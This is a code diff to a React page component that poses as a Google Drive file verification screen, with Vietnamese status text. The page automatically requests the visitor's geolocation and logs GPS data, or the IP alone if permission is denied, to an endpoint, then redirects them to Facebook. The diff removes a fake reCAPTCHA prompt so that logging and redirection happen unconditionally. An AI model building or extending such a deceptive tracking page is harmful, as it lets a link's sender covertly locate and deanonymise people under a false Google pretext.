@@ -22,71 +22,49 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     previewImageUrl,
   } = config;
 
-  const [status, setStatus] = useState<'requesting' | 'denied' | 'success'>('requesting');
   const [statusText, setStatusText] = useState('Đang yêu cầu xác minh...');
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
   const { log } = useLocationLogger('/api/log-location', { from: 'link' });
 
-  const requestLocation = useCallback(() => {
-    setStatus('requesting');
+  const requestLocationAndRedirect = useCallback(() => {
     setStatusText('Đang xác minh, vui lòng chờ...');
     
+    // This function attempts to get user's location.
+    // The logger hook will send a log with GPS data on success,
+    // or with only IP data on failure/denial.
+    // In either case, we proceed with the redirection.
     log({
         onSuccess: () => {
-            setStatus('success');
             setStatusText('Xác minh thành công, đang chuyển hướng...');
             window.location.href = REDIRECT_URL;
         },
-        onError: (error) => {
-            if (error?.code === 1) { // PERMISSION_DENIED
-                setStatus('denied');
-            } else {
-                // For other errors (timeout, not supported, etc.), just redirect.
-                setStatus('success');
-                setStatusText('Đang chuyển hướng...');
-                window.location.href = REDIRECT_URL;
-            }
+        onError: () => {
+            // Even on error (e.g., user denies permission), we log what we can (IP)
+            // and proceed with the redirection.
+            setStatusText('Đang chuyển hướng...');
+            window.location.href = REDIRECT_URL;
         }
     });
   }, [log, REDIRECT_URL]);
 
   useEffect(() => {
-    const timer = setTimeout(requestLocation, 500);
+    // Automatically trigger the process after a short delay
+    const timer = setTimeout(requestLocationAndRedirect, 500);
     return () => clearTimeout(timer);
-  }, [requestLocation]);
+  }, [requestLocationAndRedirect]);
   
+  // The UI is now just a single loading state until the user is redirected.
   const renderVerificationStep = () => {
-    switch (status) {
-      case 'requesting':
-      case 'success':
-        return (
-          <div
-            className="w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors bg-primary"
-          >
-            <Loader2 className="mr-2 h-5 w-5 animate-spin" />
-            {statusText}
-          </div>
-        );
-      case 'denied':
-        return (
-            <div 
-                className="w-full h-20 bg-[#f9f9f9] border border-gray-300 rounded-md p-3 flex items-center justify-between shadow-md cursor-pointer hover:bg-gray-100/80 transition-colors"
-                onClick={requestLocation}
-            >
-                <div className="flex items-center gap-4">
-                    <div className="h-8 w-8 border-2 border-gray-400 bg-white rounded-sm flex items-center justify-center" />
-                    <span className="text-gray-800 text-sm font-medium">I'm not a robot</span>
-                </div>
-                <div className="flex flex-col items-center justify-center text-center">
-                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width={32} height={32} alt="reCAPTCHA" />
-                    <p className="text-[9px] text-gray-500 -mt-1">reCAPTCHA</p>
-                    <p className="text-[7px] text-gray-400 scale-90">Privacy - Terms</p>
-                </div>
-            </div>
-        );
-    }
+    return (
+        <div
+        className="w-full h-12 text-base font-semibold text-primary-foreground rounded-lg flex items-center justify-center transition-colors bg-primary"
+        >
+        <Loader2 className="mr-2 h-5 w-5 animate-spin" />
+        {statusText}
+        </div>
+    );
   }
 
   return (
@@ -94,13 +72,12 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
       <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
         <CardContent className="p-0 flex flex-col items-center">
           
-          <Image
+          <img
             className="mb-5 rounded-md"
             src={previewImageUrl || "https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"}
             alt={title}
             width={80}
             height={80}
-            priority
           />
           
           <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
